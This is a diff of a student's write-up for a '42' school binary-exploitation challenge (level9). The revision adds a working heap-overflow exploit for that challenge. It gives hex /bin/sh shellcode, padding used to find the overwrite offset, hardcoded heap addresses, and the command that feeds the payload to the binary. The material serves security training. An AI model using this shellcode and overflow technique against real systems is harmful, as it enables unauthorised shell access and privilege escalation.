@@ -6,7 +6,7 @@
 #    By: lgarczyn <lgarczyn@student.42.fr>          +#+  +:+       +#+         #
 #                                                 +#+#+#+#+#+   +#+            #
 #    Created: 2019/05/04 18:52:46 by lgarczyn          #+#    #+#              #
-#    Updated: 2019/05/06 06:18:14 by lgarczyn         ###   ########.fr        #
+#    Updated: 2019/05/06 21:53:16 by lgarczyn         ###   ########.fr        #
 #                                                                              #
 # **************************************************************************** #
 
@@ -28,11 +28,26 @@ After some logic setting up the puzzle, it takes actions than can written as
 After our overflow, esp[4] must be a pointer to a pointer to our shellcode
 We can't overflow over that part, but we can overflow over *esp[4]
 We must write the pointer to our shellcode here
+Because the stacks may move, we also need to use the result of memcpy for the shellcode address
+	The first malloc is always 0x0804a00c on this machine
+	The address of the shellcode is therefore 0x0804a00c + 4 = 0x0804a010
+	The address of that address is just 0x0804a00c
 
-# 25 characters : the shellcode
-echo -e -n "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" > /tmp/l9
+We add the shellcode and its pointer, then try to find esp[4]
 
+rm /tmp/l9
+echo -e -n "\x10\xa0\x04\x08" >> /tmp/l9
+echo -e -n "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" >> /tmp/l9
+echo -e -n "---0---1---2---3---4---5---6---7---8---9" >> /tmp/l9
+echo -e -n "--a0--a1--a2--a3--a4--a5--a6--a7--a8--a9" >> /tmp/l9
+echo -e -n "--b0--b1--b2--b3--b4--b5--b6--b7--b8--b9" >> /tmp/l9
 
+Programs segfault on 0x622d2d39, or "9--b", we change that to 0x0804a008
 
-# Launch exploit
-cat /tmp/l9 - | ./level9
+rm /tmp/l9
+echo -e -n "\x10\xa0\x04\x08" >> /tmp/l9
+echo -e -n "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80" >> /tmp/l9
+echo -e -n "---0---1---2---3---4---5---6---7---8---9--a0--a1--a2--a3--a4--a5--a6--a7--a8--a" >> /tmp/l9
+echo -e -n "\x0c\xa0\x04\x08" >> /tmp/l9
+
+./level9 `cat /tmp/l9`
